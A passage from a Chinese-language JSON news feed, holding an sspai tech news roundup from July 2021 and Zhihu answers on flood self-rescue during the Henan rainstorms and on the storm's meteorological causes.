<i>Unpublished manuscript</i>.</li>\n<li>陳勁甫 , 徐強 , &amp; 許桂溶 . (2009). 層級分析法成對比較基礎標度系統之研究 . <i>管理與系統 </i>, <i>16</i>(2), 201-218.</li>\n<li>Schwartz, B. (2004, January). The paradox of choice: Why more is less. New York: Ecco.</li>\n</ol>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67804"},{"title":"派早报：真我推出 GT 大师版系列手机、KONAMI 正式弃用 PES 品牌等","date":"2021-07-22 00:55:26","description":"\n<h2>真我 GT 大师版系列手机正式发布</h2>\n<p>7 月 21 日，realme 真我正式发布真我 GT 大师版系列智能手机，该系列分为大师版和大师探索版两个型号。其中，GT 大师版该设备配备 120Hz AMOLED 直屏，支持屏下指纹；搭载高通骁龙 778G 处理器及 DRE 动态运存拓展技术；影像部分采用 3200 万索尼 IMX615 前置摄像头、6400 万超清大光圈主摄和 119º 超广角镜头。而 GT 大师探索版则搭载了骁龙 870 处理器和 6.55 英寸的 120Hz AMOLED 曲面屏，主摄为索尼 IMX766。</p>\n<p>目前，真我 GT 大师版系列已开启预售，并提供深泽直人设计的「旅行箱」版本，售价 2399 元起。<a href=\"https://m.weibo.cn/6617213711/4661417828947943\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/22/177a7dd66c2aa37a7626751b678b444f.png\"><figcaption>图片来自 realme 真我手机</figcaption></figure><h2>Apple 发布年度企业责任报告</h2>\n<p>7 月 21 日，Apple 公司通过线上发布了《2021 年度 Apple 中国企业责任报告》，报告梳理了过去一年 Apple 在践行对中国消费者和本地社区的承诺方面的具体行动，包括教育、环境责任、供应商责任、包容性和多元化、隐私保护和无障碍等。同日，Apple CEO 蒂姆·库克还表示将向河南地区捐款，以支援灾区救援和重建工作。<a href=\"https://www.apple.com.cn/job-creation/Apple_China_CSR_Report_2021.pdf\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/22/article/3d3073dbdaef4c0684baaedaa0943f03\"><figcaption>图片截取自新闻源</figcaption></figure><h2>Google 发布 Chrome 92</h2>\n<p>7 月 21 日，Google 公司正式向桌面用户以及移动端用户推送了 Chrome 92 版本，本次更新带来全新的网络钓鱼检测技术，相比此前的检测方式速度提高近 50 倍，另外本次更新还带来的新的网站隔离功能，并将功能扩展至更广泛的站点和扩展程序，另外桌面版本还加入了前进及后退缓存功能。<a href=\"https://www.howtogeek.com/742011/whats-new-in-chrome-92-available-today/\" target=\"_blank\">来源</a></p>\n<h2>索尼将推出小改款 PlayStation 5</h2>\n<p>近日，有日本网友通过对比新旧版本安全指南中的规格信息发现，索尼公司可能即将推出改良版的 PlayStation 5 游戏机。新款 PS5 的型号为「CFI-1100B」（老款为「CFI-1000B」），经对比发现，新版 PS5 的重量比老款轻了 300 克，且底部增加了指旋螺钉支架，无需螺丝刀或硬币就可以将其固定。<a href=\"http://www.vgtime.com/topic/1129770.jhtml\" target=\"_blank\">来源</a></p>\n<h2>YouTube 推出「Super Thanks」打赏功能</h2>\n<p>在线视频平台 YouTube 于近期正式推出打赏功能 Super Thanks，在 YouTube 主播发起直播时，观看者可以使用该功能为主播送出打赏。Super Thanks 目前仅有 2 美元、5 美元、10 美元和 50 美元等 4 个档位，全球 68 个国家和地区的用户均可使用该功能。<a href=\"https://tw.appledaily.com/gadget/20210721/NPBOZGUMARH4XIMW4CKMWUCTWA/\" target=\"_blank\">来源</a></p>\n<h2>斗鱼发布免费字体「斗鱼追光体」</h2>\n<p>7 月 21 日，直播平台斗鱼发布了免费字体——斗鱼追光体。斗鱼追光体基于 GB2312 编码设计，拥有一个标准字重，包含 6763 个中文字符、100 个西文及数字符号。该字体可免费下载并用于商业用途，用户通过斗鱼网站和字由平台均可下载。<a href=\"https://www.zcool.com.cn/work/ZNTM2NjI0ODQ=.html\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/22/article/978007f11b441469378cccbe068a169b\"><figcaption>斗鱼追光体字样，图片截取自新闻源</figcaption></figure><h2>三大运营商回应河南部分地区手机无信号情况</h2>\n<p>近日，受特大暴雨影响，河南省部分地区的光缆、基站产生故障导致网络中断，部分地区的手机用户出现无信号等情况。三大运营商均表示，已派出工作人员奔赴现场抢修。据运营商反映，一些地方受天气、道路泥泞等影响而无法通车，导致抢修进度缓慢。<a href=\"https://36kr.com/newsflashes/1320085412841990\" target=\"_blank\">来源</a></p>\n<h2>布里斯班成为 2032 年奥运会举办城市</h2>\n<p>当地时间本周三，国际奥委会确认，澳大利亚城市布里斯班（Brisbane）将成为 2032 年奥运会的主要举办城市，这是继 1956 年墨尔本奥运会和 2000 年悉尼奥运会之后，第三次由澳大利亚承办的奥运会。在布里斯班接手奥运会之前，该项赛事将在巴黎和洛杉矶相继举行。<a href=\"https://apnews.com/article/2020-tokyo-olympics-sports-brisbane-australia-olympic-team-germany-olympic-team-cbaf0d0e504b8bb3861f35c2876b7bbb?utm_medium=AP_Sports&amp;utm_campaign=SocialFlow&amp;utm_source=Twitter\" target=\"_blank\">来源</a></p>\n<h2>KONAMI 公布 eFootball，原 PES 品牌正式弃用</h2>\n<p>游戏开发商 KONAMI 于 7 月 21 日正式公布了旗下足球游戏新作 eFootball，该系列的原品牌名称「PES」将不再使用。eFootball 使用 Unreal 4 引擎制作，画面为次世代打造，增加了大量球场细节和更衣室活动等。KONAMI 表示，eFootball 将成为「平台型」游戏，不再按年份推出新作，而是持续加入新功能和赛季更新；游戏本体免费，玩家可以付费解锁各种比赛模式和高阶功能。eFootball 将于秋季上线，同步登陆 PlayStation 5、PlayStation 4、Xbox Series X|S、Xbox One、PC、iOS 和 Android 平台，且支持跨平台对战。<a href=\"https://www.ign.com/articles/efootball-pes-2022-free-to-play-renamed-release-date\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/22/article/40778c9e3c78205196027a090372c1f6\"><figcaption>eFootball 功能开发路线图，图片来自新闻源</figcaption></figure><h2>你可能错过的好文章</h2>\n<ul>\n<li>🔖 <a href=\"https://sspai.com/post/67830\" target=\"_blank\">不读可以先收藏 01 | 让这些好文章为你的稍后读加点料</a>\n</li>\n<li>🍎 <a href=\"https://sspai.com/post/67831\" target=\"_blank\">三点几了，喝杯果蔬汁解忧愁吧</a>\n</li>\n<li>🏥 <a href=\"https://sspai.com/post/67800\" target=\"_blank\">年轻人的体检指南 03：你该掌握的自查手段</a>\n</li>\n<li>🤖️ <a href=\"https://sspai.com/post/67797\" target=\"_blank\">你的必要隐私手册（一） —— 权限管控，存储空间隔离</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67851"},{"title":"河南多地降雨突破历史极值，当地情况如何？需要采取哪些防洪措施？","date":"2021-07-21 23:06:56","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-01c0769274df97dfa12b5f88f0ad809b_l.jpg?source=8673f162\"><span>甄昊元，</span><span>油管“甄的秀”</span>\n<a href=\"https://www.zhihu.com/question/473413447/answer/2009836619\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>暴雨自救手册</strong></p>\n<p>极端天气现象频发情况下，暴雨天气出现概率提高，尤其是一些传统降水较少的地区，突然出现历史性超量降水。</p>\n<p>短时间的超量降水和持续不断降水，会在局部地区乃至更广阔的地区造成洪涝，既有的水利设施、防汛设施和防汛手段，以及援救手段不足以立刻生效或者立刻实现全面救援。因此在灾害性暴雨情况下，应采取全面公共预警、救援和自我救助结合的方式。</p>\n<p><strong>个人户外和城乡公共区域的自救：</strong></p>\n<p>当视线可及区域出现较强流水，则应立即判断是否已经形成洪涝灾害，在判断出现洪涝天气的情况下，立即进行避险：</p>\n<p><strong>1、</strong><strong>寻找稳固的高地：</strong></p>\n<p>a) 地势较高的广场、坚固的多层高层公共建筑的 2 楼以上区域（高于水面）</p>\n<p>b) 在可能的情况下，避免在桥梁尤其是河道上的桥梁上避险。因为河道形成洪涝可能会冲垮桥梁；</p>\n<p><strong>2、</strong><strong>避免进入危险区域</strong></p>\n<p>a) 避免登上河堤等防汛设施，超强洪水有可能冲垮堤防或者漫过堤防。</p>\n<p>b) 避免进入建筑物的地下部分，以免水漫入地下部分</p>\n<p>c) 避免进入地铁等设施。虽然地铁普遍有防水防汛设计，但是超大洪涝灾害下，地铁排水能力有限，也存在一定的危险</p>\n<p>d) 不要进入地下涵洞、过街隧道等地</p>\n<p>e) 不要进入地下人防工程中</p>\n<p>f) 不要进入地下商街</p>\n<p>g) ……</p>\n<p>h) 总之水往低处去人往高处走，要避开低地</p>\n<p>i) 避免靠近老旧建筑物</p>\n<p>j）远离山坡，雨太大可能会造成次生灾害如泥石流等等。离坡地远点。</p>\n<p>k）不要站在树下和树旁。不要靠近广告牌、牌匾。</p>\n<p>l）不要站在下坡道路上，不要站在汽车后面。水冲下来的时候，连车带水撞到，会很危险。</p>\n<p>m）评论区 <a href=\"http://www.zhihu.com/people/25998f545b0094369e8c61302a022228\">@仲夏莎莎</a> ：转移的时候千万别穿拖鞋凉鞋，更不要光脚，涉水会很危险，容易受伤滑倒。</p>\n<p>n）知友 <a href=\"http://www.zhihu.com/people/b917cabd9a3d4a2faa594ce0bd835259\">@德风</a> ：如果必须在路上走：不要走人行道，很多地方已塌陷，但是你看不到；沿着路中间的绿化带走，一是因为路中间地势最高，二是因为绿化带旁没有窨井盖。建议带个棍子，摸索着走，我就是把办公室的扫把拿走了。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-edc4840cae8931cde3979a70c91c757c_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>3、</strong><strong>暴雨天气不要使用交通设施</strong></p>\n<p>a) 不要开车到处跑，暴雨之下地面情况完全被掩盖，无法准确判断积水情况，一旦滑入低地，就是送死。车不要了。尽可能马上就地停车。停到道路两侧，不要阻挡通路。记下停车的位置，拍照发朋友圈记录地址。事后再和保险公司想办法。只要人在，啥车都买得回来。</p>\n<p>b) 尽快离开公共交通设施。暴雨之下公共交通设施也存在危险，无论是公交车、地铁、出租车，乃至高铁等，都可能中断，在地下停运的地铁、在低洼地带的公交车，都非常危险，离开交通工具，找到安全位置。</p>\n<p>c) 不要怕淋湿身体 ，现在天气不冷，淋雨不会失温，就当洗澡了。没伞也不怕，被人看到身体线条也不怕，生命最重要，谁也不会嘲笑谁。这是说室外避嫌。到了干燥的地方还是要尽可能找干衣服，因为有人说即便夏季长时间在水中也会失温。</p>\n<p>d) 如果离开交通工具，最好保持集体行动。全车人一起撤离，最好彼此手拉手，确保无人掉队，也确保在小的危险下，能够彼此援助。</p>\n<p>e) 在暴雨下，积极寻找安全位置的时候，不要急着去打电话，不要急着去发朋友圈、不要急着自拍，不要急着玩手机，雨水可能会损坏手机、太早消耗掉存电后果可能很严重。</p>\n<p>f) 找到高地、找到能避雨的高地，在确保自身安全的情况下，再去使用电话，和外界联系。</p>\n<p><strong>4、</strong><strong>远离电力设施</strong></p>\n<p>a) 避险过程中一定要远离电力设施。远离高压线、高压电塔。远离变电器。远离有供电危险标志的一切物品。</p>\n<p>b) 远离电线和绳索状的物品。</p>\n<p>c) 远离电闸、配电箱。 <a href=\"http://www.zhihu.com/people/d134fab589814cbf20aad996a6841c71\">@猛男使用者</a> 提出，公交站牌和路边的广告灯箱也可能会带电，注意保持距离。</p>\n<p>d) 在无法确保身体和手干燥的情况下，不要碰触插座、开关等带电设备。</p>\n<p>e) 避免站到露天的高处，避免雷击。</p>\n<p>f）知友“风也温柔”：遇到塌方救人一定要不要挤成一团，避免二次塌方，找好绳子等安全措施！</p>\n<p><strong>5、</strong><strong>个人通讯</strong></p>\n<p>a) 在户外遇险，要确保自己能支持到救援人员抵达、确保自己在得到安全后还有能力和亲友联系，因此需确保自己手机有电。节约用电！</p>\n<p>b) 因此在离开交通工具的时候可以给亲友发个消息，无论微信还是朋友圈，标记自己的位置、车辆的位置、自己撤离的计划。然后停掉操作手机，关机也可以，开始和大家一起撤离。</p>\n<p>c) 到达安全位置后，再发一条信息，标记自己当前的位置、身边人员的情况和安全情况，告知大家自己暂时安全，并为了节省电力会减少和外界联系。</p>\n<p>d) 如果周围水情已经导致自己无法离开，可以立刻向警方汇报自己所处位置、有多少人、周围水情、紧急通讯方式等，然后停止使用手机，等待救援。在暂时安全的情况下不要频繁呼救，给警方让出信道，大灾之中信道很忙。</p>\n<p>e) 如果周围环境支持你给手机充电，或者你手中有富余的充电宝等，可以立即充电，但是减少使用手机，因为我们无法判断是否会停电、自己的电力能支持到什么时候。</p>\n<p>f) 在可能的情况下，确认亲友的安全，并且向亲友提供必要的指导、要求亲友节约用电。</p>\n<p>g) 当获得亲友达到安全位置后，约定每隔 2-4 小时或者更久通讯一次的低频度联系方案，以降低彼此的通讯消耗。</p>\n<p>h) 灾情之下，周边电力、信号都有可能中断，也有可能出现全民集中通讯导致信号拥堵的问题，遇到这类情况不要慌乱，设法和公安部门取得联系，告知你的困难，等待政府救助。这个时候你自己着急解决不了问题。</p>\n<p>i) 如果多人集体在某处避险，只要能不被淹没，多人就更容易获得救助和救援。</p>\n<p>j) 和身边的人一起互助，大家共同使用有限的电源和通讯设备，以保障大家能更在恶劣环境下坚持更久。</p>\n<p>k) 和身边的人彼此鼓励彼此帮助，在恶劣环境下大家团结，就能活得更久。彼此支持彼此包容，不要闹矛盾。</p>\n<p>l) 如果有收音机，可以使用收音机收听政府发布的消息。在电力中断和手机信号中断的情况下，收音机还能够获得来自政府的信息，即便本地的电台也中断广播，你还能获得相邻城市乃至中央的广播。相信政府没有忘掉你，相信政府一定会来救援你。</p>\n<p>i）眼下是一个几千万人乃至上亿人身置其中的大事件，通讯条件绝对无法应付所有人同时通话。救援也绝对无法同时救每个人。所以在确保暂时安全的情况下，暂时不要打电话和电话呼救，把信道让给指挥中心和有需要的人。</p>\n<p>j）尽可能和多人在一起。人越多，目标越大，越容易获救。救援时也能一波被救走，节省资源。不要单独行动 孤身在大水中最危险。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-bfc9c3cac9cb775d187dd616f06d91ac_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>社区自救和居家自救</strong></p>\n<p>1、 大多数人居住在小区中，社区一般由基层居民组织，在灾难来临时，居委会就是最基层的离你最近的政府。积极和居委会取得联系，乃至和自己的楼长、单元长取得联系，就能快速组建一个居民自救的集体。人多力量大，组织起来后，更容易战胜灾害。</p>\n<p>2、 低楼层的人员应立即做好转移的准备。如果水没有漫进单元，可以利用这个时间，做一下人员转移的准备，以及整理一下需要携带转移的物资。</p>\n<p>3、 老弱病人等，需提前进行转移。如果可能，就申请借住到高楼层的邻居家中。如果不便，哪怕在高楼层过道、楼梯上暂时安顿下来也好。</p>\n<p>4、 有需要使用维生设备，如呼吸机、氧气瓶的人，需及时将维生设备搬迁出来，申请接入邻居家的电路上，确保在供电正常的情况下能够维持生存。并且及时给备用的氧气袋充气，确保在断电后还能够获得紧急的氧气供应。</p>\n<p>5、 一般家庭，需要随身携带的物品并不多。一些怕浸水的票证票据可以用塑料袋、保鲜袋封好，随身携带，或者放置在家中避水的位置。家中一般最避水的设备是电冰箱。把这些物品放在电冰箱中，一定程度上可以保证干燥和安全，关起门来电冰箱一般不会被水冲走。重要物品因此可以得到保全。诸如收藏的邮票、钱币、字画、书信等，都可以用这种办法来保存。乃至化妆品、珠宝首饰、手办等小件收藏品，都可以用这种办法保存。如果怕大水漫灌冲开冰箱的门，可以用胶带把冰箱缠一圈，门就能闭锁。当然，大水过后，冰箱是肯定没法用了，冰箱里原来保鲜冷冻的食品也没法用了，所以如果预计大水会灌到家里来，不如现在就把冰箱里的东西清空，用来做贵重物品的保险柜。</p>\n<p>6、 老人、儿童和病弱人士使用的必要用品。</p>\n<p>7、 断掉家中的电源，避免家中进水导致设备短路和电线短路，避免短路造成的电火灾。</p>\n<p>8、 拔掉家用电器的电源线。</p>\n<p>9、 关闭各级燃气开关。避免燃气泄漏。</p>\n<p>10、 随身携带手机、充电线、充电头、充电宝。确保有通讯能力。</p>\n<p>11、 如果有无线电爱好者，有对讲机和小型电台，请携带好，并且告知社区人员，这些可能成为特别重要的救援通讯设备。</p>\n<p>12、 家中如果有便携式收音机和电池，带上。不仅可以确保自己能够获知外界的信息，也能帮助邻里乃至社区。</p>\n<p>13、 离开前关闭门窗。尽量避免进水。</p>\n<p>14、 户口、身份证之类甚至都可以不带，只要社会恢复秩序，这些随时都可以重新办理。靠人脸和指纹，公安机关就可以确认你的身份。但是结婚证、学位证、毕业证等需要做好保护，这些都不太容易补办。需要报销的发票、报修凭证等也都需要保管好。这些都存在冰箱里即可。如果没有冰箱，找一个密封的塑料盒或者其它饭盒，或者暖壶、或者保温杯，都是很好的密封工具。可以保证在大水之后还完好如初。 <a href=\"http://www.zhihu.com/people/399d62bcc21863ef3d46dfa798f5801f\">@亚托克斯</a> 认为密封的瓶子可以充当浮力救助设备。饮料瓶、饮水机的水桶都可以这么用。较轻的木板、泡沫块，也可以用作浮力救助用具。浮力瓶可以用胶带之类捆扎在上半身，效果会好。不要绑在腰部或腰以下，可能会因为重心问题导致头下脚上而溺水。</p>\n<p>15、 备用的食物，比如包装好的饼干、方便面等等，可以随身携带。如果大水一时无法过去，可以充饥。从冰箱里清理出来的食物，熟食类的可以随身携带。无法食用的生鲜可以打包丢弃掉到垃圾站或者寄存 - 送给楼上的邻居。没有办法生火的话，生的鱼肉蛋之类根本无法食用。就当成垃圾好了。</p>\n<p>16、 如果家中有游泳圈、充气艇、充气床等物品，带在身边，这些不仅能保障你一家人的安全，在必要的时候还能救助更多人。</p>\n<p>17、 有水果刀、剪刀、创口贴、外用消毒药物、抗生素、家人日常使用的药物等随身携带。</p>\n<p>18、 打火机。</p>\n<p>19、 有行动能力的健康人，在社区的指导下组成团队，分别负责救援、维修、维持秩序、卫生救助和自助服务。中国人只要组织起来，能战胜一切。</p>\n<p>20、 在社区的组织下，积极将现场情况上报上一级政府。包括所处环境、现场水情、电力状况、燃气线路状况、道路交通状况，最重要的是现场的准确人数，以及男女人数、老弱人数、患病和伤亡人员情况及时上报，以便于政府调动资源进行救援。</p>\n<p>21、 如果有救助用的绳索之类的，带好。</p>\n<p>22、 在社区的组织下，可以组织起一个善于使用工具的团队，制作一些加固或者防水设施。</p>\n<p>23、尽可能喝瓶装水。内涝可能会导致局部给排水混流，自来水未必安全。</p>\n<p>24、燃气管网相关部门，根据情况应该决定是否关闭部分地区燃气阀门。</p>\n<p>25、小镜子，手电筒。小镜子白天可以用于救援。手电筒用于夜晚。节约使用。</p>\n<p>26、知友“沧海我不笑”：还有就是水灾首先要注意饮用水安全，部队进去了估计瓶装水供应问题不大，所以一定要喝瓶装水，迫不得已使用自来水一定要煮沸。水灾饮用水污染很容易痢疾。饮用水空瓶子留着绑在一起可以做救生衣。短时间干净食物可能会短缺，但不要超市哄抢，部队在肯定会解决，有什么吃什么。干净衣物，保暖用品要有，湿透及时换衣服，夏天失温一样会冻死人。</p>\n<p>27、知友 <a href=\"http://www.zhihu.com/people/450d6fdb403b447cb7d6086b311fac13\">@码农李贰叁</a> ：安全套（装手机可以防水；紧急情况可以做止血带；吹气后放入裤子里做简易救生圈）</p>\n<p>28、糖！糖是方便的能量补充物。把家里的糖随身带着，这时候就不要顾虑会不会发胖了。</p>\n<p>29、遵纪守法：不信谣不传谣。不使用暴力。不抢掠物资。不伤害他人。法律可畏，守法才有秩序，才有多一分获救机会。</p>\n<p>30、微博用户 雩歌 - ：今天月经期的女孩儿，如果经历过长时间的雨水浸泡，不要过于担心害怕，请在脱离雨水浸泡后有条件的情况下及时清洗外阴防止感染，因为阴道正常情况是前后壁贴合，然后还有皮褶，再加上生殖道长度以及宫颈口的阻隔，想要逆行感染上宫腔有点儿困难，但在脏水浸泡之后，清洗外阴是非常有必要的</p>\n<p>31）获取干净水的方法，来自知乎 <a href=\"http://www.zhihu.com/people/bd8af9584952286b0f4896f4ef1384f0\">@龙牙</a> ，虽然他拉黑我了，但不妨碍我可以链接一个他的回答。解放军认证，好用，毛细虹吸净水法：</p>\n<p><a href=\"https://www.zhihu.com/answer/2010935734\">龙牙：河南多地降雨突破历史极值，当地情况如何？需要采取哪些防洪措施？</a></p>\n<p>#河南暴雨互助#</p>\n<p><strong>公共预警和准备</strong></p>\n<p>1、 通过各种手段，立即发布灾害信息，包括网络、电视、广播、空袭警报、流动车辆、企事业单位动员、社区动员等手段。</p>\n<p>2、 公共预警应对暴雨的时间、强度、可能灾害情况作出预告和说明，在可能情况下，应提供自救指导，</p>\n<p>3、 发布紧急求救热线，并确保求救热线畅通。</p>\n<p>4、 防汛救助组织、人员和设施就位，各级指挥系统畅通。</p>\n<p>在灾害环境下，如果政府暂时失能，如何应对？</p>\n<p>突然的暴雨可能导致地区性政府失能，包括通讯阻断、电力中断、信号消失、公共信息系统中断等。一方面政府要做好突发失能的预案，积极组织以恢复政府的指挥和救援功能。另一方面，在没有政府组织和指挥的情况下，全社会每一个分子都要做好可能范围内的自救。</p>\n<p><strong>企事业单位自救</strong></p>\n<p>登封铝合金厂爆炸事件实际上是一个企业自救的典范：当洪水来时，全员立刻停产撤离，不急于抢救企业财产。最终虽然出现爆炸，但这种反应槽中剩余的熔融金属遇水导致的爆炸不可避免，而正是因为人员撤离及时，截止目前没有人员伤亡的报道，可以说是不幸中的大幸。</p>\n<p>其它非防汛相关的企事业单位也可以参考这种操作。在暴雨和洪水来临的时候，不必要求全员在岗，而应该及时组织人员撤离到安全位置，然后积极应对下一阶段的事态。</p>\n<p>企事业单位如确保安全，应积极启用自己手中的救援物资。做好救援物资的管理和分发，在确保自身安全的情况下，对临近地区的人员提供必要的支援。</p>\n<p>企事业单位如有确定安全的场地（如地市较高的广场、可容纳较多人员的房屋等），可积极做好开放接纳避险人员的准备。</p>\n<p>企事业单位可以组织自身的安保团队，负责自己物业和辖区范围内的秩序管理。并设法和当地公安部门取得联系，将现场情况及时上报公安部门，获得相关的指导。</p>\n<p>在确保安全的情况下，企事业单位应该设法打通自己周边的通道，使用自己的通讯设施、信息发布设施和户外设施，对外发布信息，告知自身安全情况、人员情况、可提供场地情况、可提供物资情况。</p>\n<p>在可能的情况下，设法保证自己单位存储的水、粮食、食物、卫生用品的安好。除可以确保本单位驻留人员使用外，必要的情况下还可以救助需要的人。</p>\n<p>超大降雨会引起前所未曾经历过的灾害，灾害之下一定要果断应对。要清楚的认识到生命是最重要最宝贵的，而家中无法携带的财物都必须要及时处理甚至抛弃掉。只要人在家就在，只要家在，一切都可以重新来过，相信自己，相信各级政府，相信我们的国家。</p>\n<p>我在哈尔滨，祝你平安。</p>\n<hr>\n<p>插几个可能有用的救灾用品，看来可以常备。今年夏天雨水大。雨季还没过去呢。</p>\n<p><a href=\"https://www.zhihu.com/question/20004747\">车掉在水中，该怎样逃生？</a></p>\n<p>附人民网紧急救助通道</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//h5.peopleapp.com/floodhelp/\" target=\"_blank\" rel=\"nofollow noreferrer\">河南暴雨紧急求助通道</a></p>\n<p>附：应急用品清单，来自网络。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-1d99fb2bde0db669837d97e27a2b0bf7_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-b86d73f20b2988242a9b5d7ed3733485_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-858ce04429c9955d52861b063ba527ac_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-69f99b54773ae568b7dbde5c5e022b10_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-ddc284371e409d2286b9ddd28497dd71_720w.jpg?source=8673f162\" alt=\"\"></figure><p><a href=\"https://zhuanlan.zhihu.com/p/39851425\">暴雨来袭，不得已涉水时一定要注意这些危险！</a></p>\n<p><a href=\"https://www.zhihu.com/answer/116248122\">有车以后：困在大雨中，打不开车门，该如何自救？</a></p>\n<hr>\n<p>题外几句话，但是有用：</p>\n<p>河南现在的降水是意外的天灾。有条件查以往降水记录的可以知道，河南平均年降水一年在 600mm 左右，郑州过去 24 小时就降水逼近（或者超过）600mm，一个小时降水 200mm。相当于一年的雨下在一天，什么样的排水都扛不住。在海边一样扛不住。所以请先不要抱怨政府排水设计。大家积极互救自救。挺过眼前难关再说。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/473413447\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738344"},{"title":"河南今年为什么会下那么大的暴雨？形成的原因是什么？","date":"2021-07-21 23:06:52","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-0ad209551001d14f404b1fcba3f403f1_l.jpg?source=8673f162\"><span>牛正蓝，</span><span>地理老师+两娃奶爸/和这回答一样好的，我还有410个•ᴗ•</span>\n<a href=\"https://www.zhihu.com/question/473581718/answer/2010805596\" hidden>阅读原文</a>\n</div>\n<div>\n<p>我国气象部门规定， 24 小时降水量达 50 毫米以上称为“暴雨”，100～250 毫米为“大暴雨”，250 毫米以上为“特大暴雨”，这还是 24 小时。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-95997df5ad59bf69c9929a29a263b006_720w.jpg?source=8673f162\" alt=\"\"><figcaption>看一下昨天郑州降水情况</figcaption></figure><p>一小时降水 200mm，有的人可能没概念，感觉没有这么多。可以这么算，郑州市 7500 平方千米左右 X 降水 0.2/1000 千米高，得 1.5 立方千米的水量。换算成立方米为 15 亿立方米，约为太湖水量的三分之一，约为杭州西湖水量的 150 倍，相当于一小时之内，三分之一个太湖或者 150 个西湖的水灌进郑州。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-5a6b51ba5c19564347c3e68c2db80848_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-591d6cd13ac2731fef75728b7ead7f4d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>当前</figcaption></figure><p>学过高中地理都知道，我国季风区气候特征之一：<strong>降水变率大</strong>。由于<strong>季风强弱和进退</strong>的时间早晚变数大，导致雨带在某一地区滞留的时间长短不一，各地每年的降水量差异都比较大。另外，<strong>台风</strong>的多少和强度及移动路径，也是不稳定因素。而且，总的来说，降水少的地方，年际变化大，北方大于南方。</p>\n<p>毕竟是地理高中地理老师，用高中地理难度讲一下洪涝的成因。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-c274aee058ed5ebb5dbfebbd4a0340fc_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>1.季风。</strong>每年七八月份，副热带高压北上，<strong>锋面雨带北移，夏季风强，北涝南旱。</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-c4815c2b8dea576e43e251d186e12632_720w.jpg?source=8673f162\" alt=\"\"></figure><p>今年的特殊之处是，副热带高压加强并提前大幅北抬，目前中心脊线位于东北地区。这使得从南部沿海一直到华北平原，都是充满太平洋水汽的东南风，同时形成了“黄淮气旋”，即温带气旋，就像陆地上的台风一样，副热带高压边缘对流强烈，加上西南暖湿气流不断输送水汽，这是大背景。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-1dc1021db9b2de4c4c61ea0dff21c7f1_720w.jpg?source=8673f162\" alt=\"\"><figcaption>黄淮气旋示意图，虽然不是今年的，但其实原理差不多</figcaption></figure><p><strong>2.台风！</strong>双台风共舞，西北太平洋上有台风“烟花”，广东省在登陆的有台风“查帕卡“。当然造成此次暴雨的主要是台风“烟花”，”查帕卡“也助纣为虐，帮助西南季风输送水汽。大量的水汽通过偏东风源源不断北输送到河南。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-be73c19118500ebaf55aad48a4d5032f_720w.jpg?source=8673f162\" alt=\"\"><figcaption>中部大的气旋为烟花，西部为查帕卡</figcaption></figure><p><strong>3.地形。</strong>河南地势自西向东倾斜，西部为太行山、伏牛山，暖湿气流遇到山地阻挡，在迎风坡收到地形台生，形成地形雨，加剧了锋面雨和对流雨。而中部东部又太平，排水不畅。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-966a491c21e94817ddfc7e928a42657b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>不知道有没有河南的朋友，能说一下是不是雨停了？我还担心<strong>山区</strong>的泥石流、滑坡、洪水等次生灾害，毕竟住在山区的人也难以在网上发声，城市还是能集中更大救援力量的。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/473581718\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738340"},{"title":"河南降雨引发的一系列问题是否可以通过提高给排水系统合理规避？","date":"2021-07-21 23:06:46","description":"<div>\n<div>\n<div>\n<img 